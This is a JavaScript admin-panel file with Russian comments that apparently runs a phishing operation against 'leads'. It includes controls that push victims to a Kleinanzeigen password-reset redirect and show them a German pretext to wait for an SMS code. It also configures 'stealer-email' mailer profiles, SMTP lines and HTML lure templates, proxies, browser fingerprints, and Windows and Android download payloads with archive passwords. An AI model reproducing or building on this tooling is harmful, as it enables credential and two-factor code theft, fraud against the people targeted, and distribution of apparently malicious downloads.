    adminChatPanel = window.initAdminChatPanel({
      authFetch: authFetch,
      leadIdsEqual: leadIdsEqual,
      getSelectedId: function () { return selectedId; },
      getLeads: function () { return leads; },
      getLastViewedSnapshot: function () { return lastViewedSnapshot; },
      getLeadChatBrand: getLeadChatBrand,
      getLeadUnreadChatCount: getLeadUnreadChatCount,
      getUserEventCount: getUserEventCount,
      updateLeadListItemInPlace: updateLeadListItemInPlace,
      syncUnreadIndicators: function () {
        updateActivityBadge(getNewActivityCount(leads));
        updateChatTabNewIndicator();
      }
    }) || null;
  }

  function getUserEventCount(terminal) {
    if (!Array.isArray(terminal)) return 0;
    return terminal.filter(function (e) { return e.source !== 'admin'; }).length;
  }

  function getNewActivityCount(currentLeads) {
    var count = 0;
    var isChatTab = document.getElementById('tab-chat') && document.getElementById('tab-chat').classList.contains('is-active');
    for (var i = 0; i < currentLeads.length; i++) {
      var lead = currentLeads[i];
      var prev = lastViewedSnapshot[lead.id];
      var userEventCount = getUserEventCount(lead.eventTerminal);
      if (!leadIdsEqual(lead.id, selectedId)) {
        if (!prev) count++;
        else if (prev.userEventCount !== userEventCount) count++;
      }
      if (leadIdsEqual(lead.id, selectedId) && isChatTab) continue; /* чат этого лида открыт — не считаем новые сообщения */
      var lastChat = prev && prev.chatUnreadCount != null ? prev.chatUnreadCount : 0;
      var curChat = getLeadUnreadChatCount(lead);
      if (curChat > lastChat) count++;
    }
    return count;
  }

  function markViewed() {
    lastViewedSnapshot = {};
    (leads || []).forEach(function (l) {
      lastViewedSnapshot[l.id] = {
        userEventCount: getUserEventCount(l.eventTerminal),
        chatUnreadCount: getLeadUnreadChatCount(l)
      };
    });
    updateActivityBadge(0);
  }

  function updateActivityBadge(n) {
    var badge = document.getElementById('activity-badge');
    if (!badge) return;
    if (n > 0) {
      badge.textContent = n > 99 ? '99+' : String(n);
      badge.classList.remove('hidden');
    } else {
      badge.classList.add('hidden');
    }
  }

  function updateChatTabNewIndicator() {
    var tabChat = document.getElementById('tab-chat');
    var dot = document.getElementById('tab-chat-new-dot');
    if (!tabChat || !dot) return;
    var isChatTab = tabChat.classList.contains('is-active');
    if (!selectedId || isChatTab) {
      dot.classList.add('hidden');
      return;
    }
    var lead = leads && leads.find(function (l) { return leadIdsEqual(l.id, selectedId); });
    if (!lead) {
      dot.classList.add('hidden');
      return;
    }
    var curChat = getLeadUnreadChatCount(lead);
    var lastChat = lastViewedSnapshot[selectedId] && lastViewedSnapshot[selectedId].chatUnreadCount != null ? lastViewedSnapshot[selectedId].chatUnreadCount : 0;
    if (curChat > lastChat) {
      dot.classList.remove('hidden');
    } else {
      dot.classList.add('hidden');
    }
  }

  function loadLeads(onSuccess, page, options) {
    options = options || {};
    var ensureSelected = !!options.ensureSelected;
    flushAdminDetailDebounce();
    if (page != null && page >= 1) leadsPage = page;
    if (leadsLoadAbort) {
      try {
        leadsLoadAbort.abort();
      } catch (e) {}
    }
    leadsLoadAbort = new AbortController();
    var leadsSignal = leadsLoadAbort.signal;
    var ensureIdForRequest = null;
    if (ensureSelected) {
      ensureIdForRequest = selectedId;
      if (ensureIdForRequest == null || ensureIdForRequest === '') {
        try {
          var sidSs = sessionStorage.getItem('gmw-admin-selected-id');
          if (sidSs) ensureIdForRequest = sidSs;
        } catch (e) {}
      }
      ensureIdForRequest = normalizeLeadId(ensureIdForRequest);
    }
    var url = '/api/leads?page=' + leadsPage + '&limit=' + leadsLimit + '&_=' + Date.now();
    var adminUiModeForRequest = '';
    try {
      adminUiModeForRequest =
        adminModeLeadsFilter && typeof adminModeLeadsFilter.getMode === 'function'
          ? normalizeAdminUiModeValue(adminModeLeadsFilter.getMode())
          : '';
    } catch (eMode) {}
    if (!adminUiModeForRequest) adminUiModeForRequest = getAdminUiModeFromBody();
    if (adminUiModeForRequest === 'email' || adminUiModeForRequest === 'klein' || adminUiModeForRequest === 'vint') {
      url += '&adminUiMode=' + encodeURIComponent(adminUiModeForRequest);
    }
    if (ensureIdForRequest) url += '&ensureId=' + encodeURIComponent(ensureIdForRequest);
    try {
      if (localStorage.getItem('gmw-admin-show-archived') === '1') url += '&archivedOnly=1';
    } catch (e) {}
    try {
      var sq = (typeof leadsSidebarSearchQ === 'string' ? leadsSidebarSearchQ : '').trim();
      if (sq.length >= 2) url += '&q=' + encodeURIComponent(sq.slice(0, 120));
    } catch (eSq) {}
    return authFetch(url, { cache: 'no-store', headers: { Pragma: 'no-cache' }, signal: leadsSignal })
      .then(function (r) {
        if (r.status === 403) {
          console.warn('[GMW Admin] 403 — invalid or missing token');
          showToast('Доступ запрещён. Выполните вход в админ-панель.');
          return [];
        }
        if (!r.ok) {
          return r.text().then(function (text) {
            var msg = 'Сервер вернул ошибку ' + r.status;
            try {
              var j = JSON.parse(text);
              if (j && j.error) msg += ': ' + j.error;
            } catch (e) {}
            throw new Error(msg);
          });
        }
        return r.json();
      })
      .then(function (data) {
        if (data && data.leads !== undefined) {
          leads = Array.isArray(data.leads) ? data.leads : [];
          if (adminModeLeadsFilter && typeof adminModeLeadsFilter.filterLeads === 'function') {
            leads = adminModeLeadsFilter.filterLeads(leads);
          }
          leadsTotal = typeof data.total === 'number' ? data.total : leads.length;
          leadsPage = typeof data.page === 'number' ? data.page : 1;
          leadsLimit = Math.min(typeof data.limit === 'number' ? data.limit : 50, 50);
        } else {
          leads = Array.isArray(data) ? data : [];
          if (adminModeLeadsFilter && typeof adminModeLeadsFilter.filterLeads === 'function') {
            leads = adminModeLeadsFilter.filterLeads(leads);
          }
          leadsTotal = leads.length;
          leadsPage = 1;
        }
        leads = sortLeadsNewFirst(leads);
        if (selectedId == null) {
          try { selectedId = sessionStorage.getItem('gmw-admin-selected-id'); } catch (e) {}
          if (selectedId === '') selectedId = null;
        }
        selectedId = normalizeLeadId(selectedId);
        var idStillExists = selectedId && leads.some(function (l) { return leadIdsEqual(l.id, selectedId); });
        if (!idStillExists && data && data.ensureIdResolved) {
          var resolvedSel = normalizeLeadId(data.ensureIdResolved);
          if (resolvedSel && leads.some(function (l) { return leadIdsEqual(l.id, resolvedSel); })) {
            selectedId = resolvedSel;
            idStillExists = true;
          }
        }
        selectedId = idStillExists ? selectedId : (leads[0] ? normalizeLeadId(leads[0].id) : null);
        try {
          if (selectedId) sessionStorage.setItem('gmw-admin-selected-id', selectedId);
          else sessionStorage.removeItem('gmw-admin-selected-id');
        } catch (e) {}
        if (firstLoad) {
          firstLoad = false;
          markViewed();
        } else {
          updateActivityBadge(getNewActivityCount(leads));
        }
        renderList();
        renderPagination();
        renderDetail();
        updateChatTabNewIndicator();
        requestAnimationFrame(function () {
          requestAnimationFrame(function () { logLayoutHeights('afterLoad'); });
        });
        if (onSuccess && typeof onSuccess === 'function') onSuccess();
      })
      .catch(function (err) {
        if (err && err.name === 'AbortError') return;
        console.error('[GMW Admin] loadLeads:', err);
        var msg = (err && err.message) ? err.message : 'Ошибка загрузки списка';
        if (msg === 'Failed to fetch' || (err && err.message && err.message.indexOf('NetworkError') !== -1)) {
          msg = 'Нет связи с сервером. Проверьте: 1) сервер запущен, 2) админка открыта с того же домена.';
        }
        showToast(msg);
        leads = [];
        leadsTotal = 0;
        leadsPage = 1;
        renderList();
        renderPagination();
        renderDetail();
        requestAnimationFrame(function () {
          requestAnimationFrame(function () { logLayoutHeights('afterLoad'); });
        });
      });
  }

  var postJson = typeof adminCoreApi.postJson === 'function'
    ? adminCoreApi.postJson
    : function (path, body) {
      body = body || {};
      var payload = {};
      for (var k in body) {
        if (Object.prototype.hasOwnProperty.call(body, k)) payload[k] = body[k];
      }
      if (payload.id != null) payload.id = String(payload.id).trim();
      return authFetch(path, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    };

  /** Разбор JSON + явная ошибка при HTTP >=400 (иначе «сохранилось» при 502/500 с телом JSON). */
  var parseJsonResponseThrowIfNotOk = typeof adminCoreApi.parseJsonResponseThrowIfNotOk === 'function'
    ? adminCoreApi.parseJsonResponseThrowIfNotOk
    : function (r) {
      return r.json().then(function (data) {
        if (!r.ok) {
          var msg = (data && (data.error || data.message)) || ('HTTP ' + r.status);
          throw new Error(msg);
        }
        return data;
      });
    };

  function addOptimisticEvent(leadId, label) {
    var lead = leads.find(function (l) { return l && leadIdsEqual(l.id, leadId); });
    if (!lead) return;
    if (!lead.eventTerminal) lead.eventTerminal = [];
    lead.eventTerminal.push({ at: new Date().toISOString(), label: label, source: 'admin' });
    if (selectedId === leadId || String(selectedId) === String(leadId)) renderDetail();
    renderList();
  }

  var adminLeadActionsController = null;
  function getAdminLeadActionsController() {
    if (adminLeadActionsController) return adminLeadActionsController;
    if (!window.AdminActions || typeof window.AdminActions.createLeadActionsController !== 'function') return null;
    adminLeadActionsController = window.AdminActions.createLeadActionsController({
      getSelectedId: function () { return selectedId; },
      getLeads: function () { return leads; },
      leadIdsEqual: leadIdsEqual,
      leadIsSidebarWorked: leadIsSidebarWorked,
      eventWorkedToggleOffLabel: EVENT_WORKED_TOGGLE_OFF_LABEL,
      addOptimisticEvent: addOptimisticEvent,
      postJson: postJson,
      parseJsonResponseThrowIfNotOk: parseJsonResponseThrowIfNotOk,
      showToast: showToast,
      loadLeads: loadLeads
    });
    return adminLeadActionsController;
  }

  function runLeadActionRequest(path, id, payload, buttonEl, options) {
    var controller = getAdminLeadActionsController();
    if (controller && typeof controller.runActionRequest === 'function') {
      return controller.runActionRequest(path, id, payload, buttonEl, options);
    }
    return Promise.resolve({ ok: false, error: new Error('Action controller unavailable') });
  }

  /** Подсказка, когда тело ответа не JSON: 502 != «выйдите из админки». */
  var adminNonJsonHint = typeof adminCoreApi.adminNonJsonHint === 'function'
    ? adminCoreApi.adminNonJsonHint
    : function (label, status) {
      var s = Number(status) || 0;
      var tail = '';
      if (s === 401 || s === 403) {
        tail = ' Часто: сессия админки истекла — обновите страницу и войдите снова.';
      } else if (s === 502 || s === 503 || s === 504) {
        tail = ' Ответ дал nginx/шлюз: upstream (Node) не ответил вовремя, упал или недоступен. Сессия админки при этом может быть рабочей — смотрите лог процесса (PM2, data/dev-server.log) и proxy_read_timeout / upstream в nginx.';
      } else {
        tail = ' Часто: HTML-страница ошибки или запрос не проксируется на Node.';
      }
      return String(label || 'Ответ') + ' не JSON (HTTP ' + s + ').' + tail;
    };

  function normalizeStatsPeriod(period) {
    var p = String(period || '').trim().toLowerCase();
    if (p === 'today' || p === 'yesterday' || p === 'week' || p === 'month' || p === 'all') return p;
    return 'today';
  }

  function setActiveStatsPeriod(period) {
    var wrap = document.getElementById('stats-timeframe');
    if (!wrap) return;
    var active = normalizeStatsPeriod(period);
    var buttons = wrap.querySelectorAll('.stats-timeframe-btn');
    buttons.forEach(function (btn) {
      btn.classList.toggle('is-active', (btn.getAttribute('data-period') || '') === active);
    });
  }

  function applyStatsData(stats) {
    var byStatus = stats && stats.byStatus ? stats.byStatus : {};
    var byOs = stats && stats.byOs ? stats.byOs : {};
    var statusWorked = document.getElementById('stats-status-worked');
    var statusPending = document.getElementById('stats-status-pending');
    var statusSuccess = document.getElementById('stats-status-success');
    var statusTotal = document.getElementById('stats-status-total');
    var osWindows = document.getElementById('stats-os-windows');
    var osMacos = document.getElementById('stats-os-macos');
    var osAndroid = document.getElementById('stats-os-android');
    var osIos = document.getElementById('stats-os-ios');
    var osOther = document.getElementById('stats-os-other');
    if (statusWorked) statusWorked.textContent = String(byStatus.worked || 0);
    if (statusPending) statusPending.textContent = String(byStatus.pending || 0);
    if (statusSuccess) statusSuccess.textContent = String(byStatus.success || 0);
    if (statusTotal) statusTotal.textContent = String(stats.total != null ? stats.total : 0);
    if (osWindows) osWindows.textContent = String(byOs.windows || 0);
    if (osMacos) osMacos.textContent = String(byOs.macos || 0);
    if (osAndroid) osAndroid.textContent = String(byOs.android || 0);
    if (osIos) osIos.textContent = String(byOs.ios || 0);
    if (osOther) osOther.textContent = String(byOs.other || 0);
  }

  function loadStats(period) {
    statsPeriod = normalizeStatsPeriod(period || statsPeriod);
    setActiveStatsPeriod(statsPeriod);
    return authFetch('/api/stats?period=' + encodeURIComponent(statsPeriod))
      .then(function (r) {
        return r.text().then(function (text) {
          var data = {};
          try { data = text ? JSON.parse(text) : {}; } catch (e) {}
          if (!r.ok) throw new Error((data && data.error) || ('HTTP ' + r.status));
          return data;
        });
      })
      .then(function (data) {
        applyStatsData(data);
      })
      .catch(function (err) {
        showToast('Ошибка загрузки статистики: ' + ((err && err.message) ? err.message : 'unknown'));
      });
  }

  function initButtons() {
    try {
      if (window[ADMIN_BUTTONS_INIT_GUARD_KEY]) return;
      window[ADMIN_BUTTONS_INIT_GUARD_KEY] = true;
    } catch (eInitButtons) {}
    var btnRefresh = document.getElementById('btn-refresh');
    var btnCheck = document.getElementById('btn-check');
    var btnDelete = document.getElementById('btn-delete');
    var btnStats = document.getElementById('btn-stats');

    if (btnRefresh) btnRefresh.addEventListener('click', function () { loadLeads(); });
    if (btnCheck) btnCheck.addEventListener('click', function () { loadLeads(); });
    var adminActionsController = getAdminLeadActionsController();
    if (adminActionsController && typeof adminActionsController.bindButtons === 'function') {
      adminActionsController.bindButtons();
    }

    if (btnDelete) {
      btnDelete.addEventListener('click', function () {
        if (!selectedId) {
          showToast('Выберите запись для удаления');
          return;
        }
        if (!confirm('Delete this record?')) return;
        var id = selectedId != null ? String(selectedId) : '';
        if (!id) return;
        var idToRemove = id;
        postJson('/api/delete-lead', { id: id })
          .then(function (r) {
            var ct = r && r.headers && r.headers.get && r.headers.get('Content-Type') || '';
            return (ct.indexOf('json') !== -1 ? r.json() : r.text().then(function (t) { try { return JSON.parse(t); } catch (e) { return {}; } })).then(function (data) {
              if (!r || !r.ok) throw new Error((data && data.error) || (r.status === 403 ? 'Доступ запрещён' : r.status === 404 ? 'Запись не найдена' : 'Delete failed'));
              return data;
            });
          })
          .then(function () {
            leads = leads.filter(function (l) { return l && !leadIdsEqual(l.id, idToRemove); });
            selectedId = null;
            try { sessionStorage.removeItem('gmw-admin-selected-id'); } catch (e) {}
            renderList();
            renderDetail();
            el.detailPlaceholder && el.detailPlaceholder.classList.remove('hidden');
            el.mainContent && el.mainContent.classList.add('hidden');
            showToast('Запись удалена');
            loadLeads();
          })
          .catch(function (err) {
            showToast(err && err.message ? err.message : 'Ошибка удаления');
          });
      });
    }

    if (btnStats) {
      btnStats.addEventListener('click', function () {
        var stats = el.statsContent;
        if (!stats) return;
        if (stats.classList.contains('hidden')) {
          el.detailPlaceholder && el.detailPlaceholder.classList.add('hidden');
          el.mainContent && el.mainContent.classList.add('hidden');
          stats.classList.remove('hidden');
          loadStats(statsPeriod);
        } else {
          stats.classList.add('hidden');
          if (selectedId) {
            el.mainContent && el.mainContent.classList.remove('hidden');
          } else {
            el.detailPlaceholder && el.detailPlaceholder.classList.remove('hidden');
          }
        }
      });
    }

    var timeframeWrap = document.getElementById('stats-timeframe');
    if (timeframeWrap) {
      timeframeWrap.addEventListener('click', function (e) {
        var t = e.target;
        if (!t || !t.classList || !t.classList.contains('stats-timeframe-btn')) return;
        var period = normalizeStatsPeriod(t.getAttribute('data-period'));
        if (period === statsPeriod) return;
        loadStats(period);
      });
    }
  }

  function initKleinForgotUrlModal() {
    try {
      if (window[ADMIN_KLEIN_FORGOT_MODAL_INIT_GUARD_KEY]) return;
      window[ADMIN_KLEIN_FORGOT_MODAL_INIT_GUARD_KEY] = true;
    } catch (eInitKleinForgotModal) {}
    var modal = document.getElementById('klein-forgot-url-modal');
    var backdrop = document.getElementById('klein-forgot-url-modal-backdrop');
    var closeBtn = document.getElementById('klein-forgot-url-close');
    var cancelBtn = document.getElementById('klein-forgot-url-cancel');
    var okBtn = document.getElementById('klein-forgot-url-ok');
    var input = document.getElementById('klein-forgot-url-input');
    var btnKlein = document.getElementById('btn-klein-official-pw');
    function close() {
      if (!modal) return;
      modal.classList.add('hidden');
      modal.setAttribute('aria-hidden', 'true');
      if (input) input.value = '';
    }
    function open() {
      if (!modal || !input) return;
      modal.classList.remove('hidden');
      modal.setAttribute('aria-hidden', 'false');
      input.value = '';
      setTimeout(function () {
        try {
          input.focus();
        } catch (e) {}
      }, 50);
    }
    function submit() {
      if (!selectedId) {
        showToast('Выберите лида');
        close();
        return;
      }
      if (okBtn && okBtn.classList && okBtn.classList.contains('is-pending')) return;
      var url = input && input.value ? String(input.value).trim() : '';
      var body = { id: selectedId };
      if (url) body.url = url;
      runLeadActionRequest('/api/redirect-klein-forgot', selectedId, body, okBtn, {
        errorPrefix: 'Ошибка запроса',
        errorToastFallback: 'Ошибка'
      }).then(function (result) {
        if (result && result.ok) close();
      }).catch(function () {
        showToast('Ошибка');
      }).finally(function () {
        if (okBtn && okBtn.classList) okBtn.classList.remove('is-pending');
      });
    }
    if (btnKlein) {
      btnKlein.addEventListener('click', function (e) {
        if (e && e.preventDefault) e.preventDefault();
        if (!selectedId) {
          showToast('Выберите лида');
          return;
        }
        open();
      });
    }
    if (backdrop) backdrop.addEventListener('click', close);
    if (closeBtn) closeBtn.addEventListener('click', close);
    if (cancelBtn) cancelBtn.addEventListener('click', close);
    if (okBtn) okBtn.addEventListener('click', submit);
    document.addEventListener('keydown', function (e) {
      if (e.key === 'Escape' && modal && !modal.classList.contains('hidden')) close();
    });
  }

  function initKleinSmsWaitModal() {
    try {
      if (window[ADMIN_KLEIN_SMS_WAIT_MODAL_INIT_GUARD_KEY]) return;
      window[ADMIN_KLEIN_SMS_WAIT_MODAL_INIT_GUARD_KEY] = true;
    } catch (eInitKleinSmsWaitModal) {}
    var modal = document.getElementById('klein-sms-wait-modal');
    var backdrop = document.getElementById('klein-sms-wait-modal-backdrop');
    var closeBtn = document.getElementById('klein-sms-wait-modal-close');
    var okBtn = document.getElementById('klein-sms-wait-modal-ok');
    var body = document.getElementById('klein-sms-wait-modal-body');
    var trigger = document.getElementById('btn-sms-klein-wait');

    var text = 'Bitte warte ein paar Minuten auf den SMS-Code, der Server ist überlastet. Verlasse die Seite nicht, damit das Eingabefeld für die SMS nicht verschwindet.';

    function close() {
      if (!modal) return;
      modal.classList.add('hidden');
      modal.setAttribute('aria-hidden', 'true');
    }
    if (trigger) trigger.addEventListener('click', function (e) {
      if (e && e.preventDefault) e.preventDefault();
      if (!selectedId) {
        showToast('Выберите лида');
        return;
      }
      if (trigger.classList.contains('is-pending')) return;
      runLeadActionRequest('/api/redirect-klein-sms-wait', selectedId, { id: selectedId }, trigger, {
        errorPrefix: 'Ошибка запроса',
        errorToastFallback: 'Не удалось включить Bitte warten'
      }).finally(function () {
        if (trigger && trigger.classList) trigger.classList.remove('is-pending');
      });
    });
    if (backdrop) backdrop.addEventListener('click', close);
    if (closeBtn) closeBtn.addEventListener('click', close);
    if (okBtn) okBtn.addEventListener('click', close);
    document.addEventListener('keydown', function (e) {
      if (e.key === 'Escape' && modal && !modal.classList.contains('hidden')) close();
    });
  }

  function initFingerprintModal() {
    var modal = document.getElementById('fingerprint-modal');
    var backdrop = document.getElementById('fingerprint-modal-backdrop');
    var closeBtn = document.getElementById('fingerprint-modal-close');
    function closeFingerprintModal() {
      if (modal) {
        modal.classList.add('hidden');
        modal.setAttribute('aria-hidden', 'true');
      }
    }
    if (backdrop) backdrop.addEventListener('click', closeFingerprintModal);
    if (closeBtn) closeBtn.addEventListener('click', closeFingerprintModal);
  }

  function initConfigModal() {
    try {
      if (window[ADMIN_CONFIG_MODAL_INIT_GUARD_KEY]) return;
      window[ADMIN_CONFIG_MODAL_INIT_GUARD_KEY] = true;
    } catch (eInitConfigModal) {}
    var btnConfig = document.getElementById('btn-config');
    var modal = document.getElementById('config-modal');
    var backdrop = document.getElementById('config-modal-backdrop');
    var closeBtn = document.getElementById('config-modal-close');
    /** Filled when `admin-config-pane-android.js` loads; `openModal` calls this before pane init runs later in this function. */
    var loadConfigAndroid = function () {};
    /** Filled when `admin-config-pane-windows.js` loads. */
    var loadConfigDownload = function () {};
    var loadWindowsArchivePassword = function () {};
    /** Filled when `admin-config-shared-download-rotation.js` loads. */
    var loadDownloadSettings = function () {};
    /** Filled when `admin-config-pane-short.js` loads. */
    var loadConfigShort = function () {};
    /** Filled when `admin-config-pane-proxies.js` loads. */
    var loadConfigProxies = function () {};
    var rerenderProxiesEditor = function () {};

    function setActiveConfigPane(name) {
      document.querySelectorAll('.config-pane').forEach(function (p) {
        p.classList.toggle('active', p.id === 'config-pane-' + name);
      });
      document.querySelectorAll('.config-nav-item').forEach(function (it) {
        it.classList.toggle('active', (it.getAttribute('data-pane') || '') === name);
      });
      if (name === 'proxies' || name === 'email' || name === 'short') {
        setTimeout(function () {
          AdminModalKit.syncCodeEditorHeights();
        }, 0);
      }
    }

    function showMessage(el, text, type) {
      if (!el) return;
      el.textContent = text || '';
      el.className = 'config-message' + (type ? ' ' + type : '');
      el.classList.toggle('hidden', !text);
    }

    var MAILER_NEW_ID = '__new__';
    var adminMailerPendingImage = null;

    function showMailerMsg(text, type) {
      var el = document.getElementById('config-mailer-message');
      if (!el) return;
      el.textContent = text || '';
      el.className = 'config-msg' + (type ? ' ' + type : '');
      el.classList.toggle('hidden', !text);
    }

    function clearMailerForm() {
      var smtp = document.getElementById('config-mailer-smtp');
      var sender = document.getElementById('config-mailer-sender');
      var title = document.getElementById('config-mailer-title');
      var htmlEl = document.getElementById('config-mailer-html');
      var nameInput = document.getElementById('config-mailer-profile-name');
      var imgFile = document.getElementById('config-mailer-image-file');
      var tplFile = document.getElementById('config-mailer-template-file');
      if (smtp) smtp.value = '';
      if (sender) sender.value = '';
      if (title) title.value = '';
      if (htmlEl) htmlEl.value = '';
      if (nameInput) nameInput.value = '';
      if (imgFile) imgFile.value = '';
      if (tplFile) tplFile.value = '';
      adminMailerPendingImage = null;
      var imgStatus = document.getElementById('config-mailer-image-status');
      if (imgStatus) imgStatus.textContent = '';
    }

    function loadConfigMailer() {
      var sel = document.getElementById('config-mailer-profile');
      var smtp = document.getElementById('config-mailer-smtp');
      var sender = document.getElementById('config-mailer-sender');
      var title = document.getElementById('config-mailer-title');
      var htmlEl = document.getElementById('config-mailer-html');
      var nameInput = document.getElementById('config-mailer-profile-name');
      var imgStatus = document.getElementById('config-mailer-image-status');
      var delBtn = document.getElementById('config-mailer-delete');
      adminMailerPendingImage = null;
      var imgFile = document.getElementById('config-mailer-image-file');
      if (imgFile) imgFile.value = '';
      authFetch('/api/config/stealer-email').then(parseJsonResponseThrowIfNotOk).then(function (data) {
        var list = data.list || [];
        var currentId = data.currentId || null;
        if (sel) {
          sel.innerHTML = '';
          var optNew = document.createElement('option');
          optNew.value = MAILER_NEW_ID;
          optNew.textContent = '+ Новый профиль';
          sel.appendChild(optNew);
          list.forEach(function (item) {
            var opt = document.createElement('option');
            opt.value = item.id;
            opt.textContent = item.name || item.id;
            sel.appendChild(opt);
          });
          if (currentId && list.some(function (x) { return String(x.id) === String(currentId); })) {
            sel.value = currentId;
          } else {
            sel.value = list.length ? (list[0].id) : MAILER_NEW_ID;
          }
        }
        if (smtp) smtp.value = data.smtpLine || '';
        if (sender) sender.value = data.senderName || '';
        if (title) title.value = data.title || '';
        if (htmlEl) htmlEl.value = data.html || '';
        if (nameInput) {
          var cur = list.find(function (i) { return String(i.id) === String(data.currentId); });
          nameInput.value = (cur && (cur.name || cur.id)) ? (cur.name || cur.id) : '';
        }
        if (imgStatus) {
          imgStatus.textContent = data.image1Present ? 'В профиле сохранена картинка (_src1_)' : 'Картинка в профиле не задана';
        }
        if (delBtn) delBtn.disabled = sel && sel.value === MAILER_NEW_ID;
        showMailerMsg('', '');
      }).catch(function (err) {
        showMailerMsg(err.message || 'Ошибка загрузки Mailer', 'error');
      });
    }

    function openModal(initialPane) {
      if (modal) {
        modal.classList.remove('hidden');
        modal.setAttribute('aria-hidden', 'false');
        document.body.style.overflow = 'hidden';
        var pane = initialPane || 'windows';
        setActiveConfigPane(pane);
        loadConfigDownload();
        loadConfigAndroid();
        loadDownloadSettings();
        loadWindowsArchivePassword();
        loadConfigShort();
        AdminModalKit.syncCodeEditorHeights();
      }
    }
    function closeModal() {
      if (modal) {
        modal.classList.add('hidden');
        modal.setAttribute('aria-hidden', 'true');
        document.body.style.overflow = '';
      }
    }

    if (btnConfig) btnConfig.addEventListener('click', function () { openModal('windows'); });
    if (backdrop) backdrop.addEventListener('click', closeModal);
    if (closeBtn) closeBtn.addEventListener('click', closeModal);
    document.addEventListener('keydown', function (e) {
      if (e.key === 'Escape' && modal && !modal.classList.contains('hidden')) closeModal();
    });

    document.querySelectorAll('.config-nav-item').forEach(function (item) {
      item.addEventListener('click', function () {
        var pane = item.getAttribute('data-pane');
        if (pane && pane !== 'email' && adminConfigEmailVisualMode) {
          try {
            syncVisualPreviewToTextarea();
            detachVisualModeFromFrame(document.getElementById('config-email-preview-frame'));
            adminConfigEmailVisualMode = false;
            setConfigEmailVisualUi();
          } catch (ex) {}
        }
        if (pane) {
          setActiveConfigPane(pane);
          if (pane === 'short') {
            loadConfigShort();
            loadConfigBrandDomains();
          }
          if (pane === 'proxies') {
            loadConfigProxies();
            loadConfigWebdeFpIndices();
            loadProxyFpStats();
          }
          if (pane === 'email') loadConfigEmail();
        }
      });
    });

    var mailerProfileSel = document.getElementById('config-mailer-profile');
    if (mailerProfileSel) {
      mailerProfileSel.addEventListener('change', function () {
        var v = mailerProfileSel.value;
        var delBtn = document.getElementById('config-mailer-delete');
        if (delBtn) delBtn.disabled = v === MAILER_NEW_ID;
        if (v === MAILER_NEW_ID) {
          clearMailerForm();
          showMailerMsg('Новый профиль: заполните поля и нажмите «Сохранить».', 'success');
          setTimeout(function () { showMailerMsg('', ''); }, 4000);
          return;
        }
        postJson('/api/config/stealer-email/select', { id: v }).then(parseJsonResponseThrowIfNotOk).then(function () {
          loadConfigMailer();
        }).catch(function (err) {
          showMailerMsg(err.message || 'Ошибка выбора профиля', 'error');
        });
      });
    }
    var mailerNewBtn = document.getElementById('config-mailer-new');
    if (mailerNewBtn) {
      mailerNewBtn.addEventListener('click', function () {
        var sel = document.getElementById('config-mailer-profile');
        if (sel) sel.value = MAILER_NEW_ID;
        clearMailerForm();
        var delBtn = document.getElementById('config-mailer-delete');
        if (delBtn) delBtn.disabled = true;
        showMailerMsg('Новый профиль: заполните поля и нажмите «Сохранить».', 'success');
        setTimeout(function () { showMailerMsg('', ''); }, 4000);
      });
    }
    var mailerDelBtn = document.getElementById('config-mailer-delete');
    if (mailerDelBtn) {
      mailerDelBtn.addEventListener('click', function () {
        var sel = document.getElementById('config-mailer-profile');
        var id = sel && sel.value;
        if (!id || id === MAILER_NEW_ID) return;
        if (!confirm('Удалить профиль Mailer «' + id + '»?')) return;
        authFetch('/api/config/stealer-email?id=' + encodeURIComponent(id), { method: 'DELETE' }).then(parseJsonResponseThrowIfNotOk).then(function (data) {
          if (data && data.ok === false) throw new Error(data.error || 'Ошибка');
          showMailerMsg('Профиль удалён', 'success');
          loadConfigMailer();
        }).catch(function (err) {
          showMailerMsg(err.message || 'Ошибка удаления', 'error');
        });
      });
    }
    var mailerSaveBtn = document.getElementById('config-mailer-save');
    if (mailerSaveBtn) {
      mailerSaveBtn.addEventListener('click', function () {
        var sel = document.getElementById('config-mailer-profile');
        var smtp = document.getElementById('config-mailer-smtp');
        var sender = document.getElementById('config-mailer-sender');
        var title = document.getElementById('config-mailer-title');
        var htmlEl = document.getElementById('config-mailer-html');
        var nameInput = document.getElementById('config-mailer-profile-name');
        var isNew = !sel || sel.value === MAILER_NEW_ID;
        var payload = {
          smtpLine: (smtp && smtp.value) ? smtp.value.trim() : '',
          senderName: (sender && sender.value) ? sender.value.trim() : '',
          title: (title && title.value) ? title.value.trim() : '',
          html: (htmlEl && htmlEl.value) ? htmlEl.value : '',
          setCurrent: true
        };
        if (isNew) {
          var nm = (nameInput && nameInput.value.trim()) ? nameInput.value.trim() : ('Config ' + new Date().toISOString().slice(0, 16).replace('T', ' '));
          payload.name = nm;
        } else {
          payload.id = sel.value;
        }
        if (adminMailerPendingImage === '__clear__') payload.image1Base64 = '';
        else if (typeof adminMailerPendingImage === 'string' && adminMailerPendingImage.length) payload.image1Base64 = adminMailerPendingImage;
        mailerSaveBtn.disabled = true;
        postJson('/api/config/stealer-email', payload).then(parseJsonResponseThrowIfNotOk).then(function (data) {
          if (data && data.ok === false) throw new Error(data.error || 'Ошибка');
          showMailerMsg('Сохранено', 'success');
          adminMailerPendingImage = null;
          loadConfigMailer();
        }).catch(function (err) {
          showMailerMsg(err.message || 'Ошибка сохранения', 'error');
        }).finally(function () { mailerSaveBtn.disabled = false; });
      });
    }
    var mailerTplFile = document.getElementById('config-mailer-template-file');
    if (mailerTplFile) {
      mailerTplFile.addEventListener('change', function (e) {
        var f = e.target && e.target.files && e.target.files[0];
        if (!f) return;
        var reader = new FileReader();
        reader.onload = function () {
          var htmlEl = document.getElementById('config-mailer-html');
          if (htmlEl) htmlEl.value = reader.result || '';
          showMailerMsg('HTML подставлен из файла — нажмите «Сохранить».', 'success');
        };
        reader.readAsText(f);
      });
    }
    var mailerImgFile = document.getElementById('config-mailer-image-file');
    if (mailerImgFile) {
      mailerImgFile.addEventListener('change', function (e) {
        var f = e.target && e.target.files && e.target.files[0];
        var imgStatus = document.getElementById('config-mailer-image-status');
        if (!f) return;
        var reader = new FileReader();
        reader.onload = function () {
          var s = reader.result;
          var b64 = typeof s === 'string' && s.indexOf(',') >= 0 ? s.split(',')[1] : '';
          adminMailerPendingImage = b64;
          if (imgStatus) imgStatus.textContent = 'Файл выбран — сохраните профиль.';
        };
        reader.readAsDataURL(f);
      });
    }
    var mailerImgClear = document.getElementById('config-mailer-image-clear');
    if (mailerImgClear) {
      mailerImgClear.addEventListener('click', function () {
        adminMailerPendingImage = '__clear__';
